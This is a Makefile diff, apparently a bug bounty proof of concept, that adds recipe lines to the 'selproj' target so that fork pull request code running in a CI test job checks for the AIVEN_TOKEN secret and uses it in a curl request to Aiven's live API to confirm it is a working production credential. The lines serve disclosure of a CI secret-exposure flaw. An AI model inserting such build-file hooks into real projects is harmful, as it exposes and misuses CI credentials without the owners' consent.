@@ -243,6 +243,9 @@ lint-go:
 
 .PHONY: selproj ci-selproj
 selproj: $(SELPROJ)
+	@echo "[Bugcrowd 15c143b1 PoC] fork-controlled Makefile recipe is executing inside the /test job"
+	@if [ -n "$$AIVEN_TOKEN" ]; then echo "[PoC] AIVEN_TOKEN is present and readable by this fork PR code"; else echo "[PoC] AIVEN_TOKEN absent"; fi
+	@code=$$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: aivenv1 $$AIVEN_TOKEN" https://api.aiven.io/v1/me 2>/dev/null); echo "[PoC] read-only GET https://api.aiven.io/v1/me -> HTTP $$code  (200 == live production credential; non-destructive, no data captured)"
 $(SELPROJ): $(LOCALBIN)
 	$(call go-install-tool,$(SELPROJ),github.com/aiven/go-utils/selproj,$(SELPROJ_VERSION))
 
